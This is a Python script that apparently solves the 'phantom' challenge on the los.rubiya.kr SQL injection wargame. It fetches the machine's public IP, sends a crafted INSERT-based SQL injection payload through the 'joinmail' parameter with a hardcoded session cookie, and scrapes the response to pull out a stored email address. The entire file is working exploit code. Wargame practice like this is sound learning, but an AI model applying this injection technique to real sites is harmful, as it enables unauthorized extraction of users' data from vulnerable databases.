import requests
from bs4 import BeautifulSoup

url = "https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php?"
cookie = {'PHPSESSID':'o8k4eis6nm0q904ajkf4t2aiva'}

def solve():
    public_ip = requests.get("https://api.ipify.org").text
    query = "joinmail=1%27),(0,%27{},(select%20a%20from%20(select%20email%20as%20a%20from%20prob_phantom%20where%20no=1)%20as%20a))%23".format(public_ip)
    print("PUBLIC IP : " + str(public_ip))
    print(query)
    res = requests.get(url=url+query, cookies=cookie)
    soup = BeautifulSoup(res.text, 'html.parser')
    td = soup.find_all('td')
    for i in range(len(td)):
        if "@" in td[i].text:
            email = str(td[i])
            print("email : " + email[4:len(email)-5])
            break

if __name__ == "__main__":
    solve()
